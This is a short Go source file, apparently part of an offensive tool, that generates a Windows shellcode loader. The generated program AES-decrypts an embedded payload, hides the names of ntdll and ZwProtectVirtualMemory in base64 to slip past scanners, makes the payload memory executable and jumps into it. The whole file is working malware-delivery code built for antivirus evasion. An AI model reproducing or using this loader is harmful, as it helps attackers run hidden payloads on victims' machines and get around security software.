package loader

import (
	"encoding/hex"
	"fmt"
)

func LoadWindowsTemplate(s Shellcode) string {

    hexShellcode := hex.EncodeToString(s.Payload)
    hexKey := hex.EncodeToString(s.AesKey)

    return fmt.Sprintf(`
package main

import (
        "crypto/aes"
        "encoding/base64"
        "encoding/hex"
        "os"
    "unsafe"
        "syscall"
)

func decrypt(key string, payload string) []byte {
    ciphertext, _ := hex.DecodeString(payload)
    keyAsBytes, _ := hex.DecodeString(key)

    c, err := aes.NewCipher(keyAsBytes); if err != nil {
        os.Exit(1)
    }

    plaintext := make([]byte, len(payload))
    c.Decrypt(plaintext, ciphertext)
    s := string(plaintext[:])
    return []byte(s)
}

func main() {
    /* decrypt shellcode using AES */
    payload := decrypt("%s", "%s")
    ntdll, _ := base64.StdEncoding.DecodeString("bnRkbGw=")
    zwprotectMemory, _ := base64.StdEncoding.DecodeString("WndQcm90ZWN0VmlydHVhbE1lbW9yeQ==")

    var hProcess uintptr = 0
    var pBaseAddr = uintptr(unsafe.Pointer(&payload[0]))
    var dwBufferLen = uint(len(payload))
    var dwOldPerm uint32

    /* prepare syscall in memory */
    syscall.NewLazyDLL(string(ntdll)).NewProc(string(zwprotectMemory)).Call(
        hProcess - 1,
        uintptr(unsafe.Pointer(&pBaseAddr)),
        uintptr(unsafe.Pointer(&dwBufferLen)),
        0x20, /* PAGE_EXEC_READ */
        uintptr(unsafe.Pointer(&dwOldPerm)),
    )

    /* run syscall */
    syscall.Syscall(
        uintptr(unsafe.Pointer(&payload[0])),
        0, 0, 0, 0,
    )
}
`, hexKey, hexShellcode)
}


